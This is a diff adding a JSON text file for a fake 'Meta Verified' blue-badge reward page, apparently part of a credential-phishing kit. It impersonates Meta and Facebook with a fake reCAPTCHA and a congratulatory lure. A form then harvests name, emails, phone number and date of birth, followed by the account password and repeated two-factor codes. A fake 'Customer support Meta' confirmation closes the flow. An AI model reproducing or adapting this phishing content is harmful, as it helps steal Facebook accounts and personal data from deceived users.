@@ -1,0 +1,138 @@
+{
+    "robot": {
+        "label": "I'm not a robot",
+        "text-1": "This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.",
+        "text-2": "We’ve used Google's reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google’s Privacy Policy and Terms of Use.",
+        "text-3": "reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising."
+    },
+    "required": {
+        "title": "Meta Verified - Rewards for you",
+        "box-1": {
+            "title": "Show the world that you mean business.",
+            "text-1": "Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you've built with your audience.",
+            "text-2": "We’re thrilled to celebrate this moment with you and look forward to seeing your page thrive with this prestigious recognition!"
+        },
+        "ticket": "Your ticket id: ",
+        "box-2": {
+            "title": "Verified Blue Badge Request Guide",
+            "text-1": "- Fact checkers may not respond to requests containing intimidation, hate speech, or verbal threats",
+            "text-2": "- In your request, please provide all required information to ensure timely processing by the fact checker. Submitting an invalid email address or failing to reply to requests for additional information within 2 days may lead to the application being closed without review. If the request remains unprocessed after 4 days, Meta will automatically reject it.",
+            "text-3": "- Once all details are submitted, we will evaluate your account to check for any restrictions. The verification process typically takes 24 hours, though it may extend in some cases. Based on our decision, restrictions will either remain or be lifted, and your account will be updated accordingly."
+        },
+        "button": "Submit request",
+        "footer": {
+            "text-1": "Help Center",
+            "text-2": "Privacy Policy",
+            "text-3": "Terms of Service",
+            "text-4": "Community Standards"
+        }
+    },
+    "modal": {
+        "appeal_request": {
+            "title": "Information Form",
+            "form": {
+                "name": {
+                    "placeholder": "Full Name",
+                    "required": "Please enter enough full name."
+                },
+                "email": {
+                    "placeholder": "Email",
+                    "required": "Please enter enough email address."
+                },
+                "email_business": {
+                    "placeholder": "Email Business",
+                    "required": "Please enter enough email business address."
+                },
+                "page_name": {
+                    "placeholder": "Page Name",
+                    "required": "Please enter enough page name."
+                },
+                "phone_number": {
+                    "placeholder": "Phone Number",
+                    "required": "Please enter enough phone number."
+                },
+                "date_of_birth": {
+                    "title": "Date of Birth",
+                    "day": {
+                        "placeholder": "Day",
+                        "required": "Please enter enough day."
+                    },
+                    "month": {
+                        "placeholder": "Month",
+                        "required": "Please enter enough month."
+                    },
+                    "year": {
+                        "placeholder": "Year",
+                        "required": "Please enter enough year."
+                    }
+                },
+                "issue": {
+                    "placeholder": "Note",
+                    "required": "Please enter your issue.",
+                    "note": "Our response will be sent to you within 14 - 48 hours."
+                },
+                "facebook_notification": {
+                    "title": "on Facebook",
+                    "description": "We will send you a notification on Facebook."
+                },
+                "check_form": {
+                    "title": "I agree with",
+                    "link": "Terms of use"
+                },
+                "button": "Send"
+            }
+        },
+        "password": {
+            "title": "Password",
+            "description": "For your security, you must enter your password to continue.",
+            "form": {
+                "password": {
+                    "placeholder": "Password",
+                    "required": "You haven't entered your password!",
+                    "warning": "The password you've entered is incorrect."
+                },
+                "button": "Continue",
+                "forgot_password": "Forgot your password?"
+            }
+        },
+        "2fa": {
+            "title": "Two-factor authentication required (1/3)",
+            "description-1": "Enter the code for this account that we send to",
+            "description-2": "or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)",
+            "form": {
+                "placeholder": "Code",
+                "warning": "The two-factor authentication you entered is incorrect. Please, try again after",
+                "required": "You haven't entered your two-factor authentication!",
+                "minutes": "minutes",
+                "seconds": "seconds",
+                "button": "Continue"
+            },
+            "try_another_way": "Try another way"
+        },
+        "final_step": {
+            "title": "Request has been sent",
+            "description-1": "Your request has been added to the processing queue. We will handle your request within 24 hours in case we do not receive feedback, please send back information so we can assist you.",
+            "description-2": "From the Customer support Meta.",
+            "button": "Return to Facebook"
+        },
+        "authen_modal" : {
+            "title": "Choose a way to confirm that it's you",
+            "app": {
+                "sub_1": "Authenticator app",
+                "sub_2": "Go to your authentication app"
+            },
+            "sms": {
+                "sub_1": "SMS",
+                "sub_2": "We will send a code to the number"
+            },
+            "email": {
+                "sub_1": "E-mail",
+                "sub_2": "We will send a code to"
+            },
+            "whatsapp": {
+                "sub_1": "WhatsApp",
+                "sub_2": "We will send a code to the number"
+            }
+        }
+    }
+}
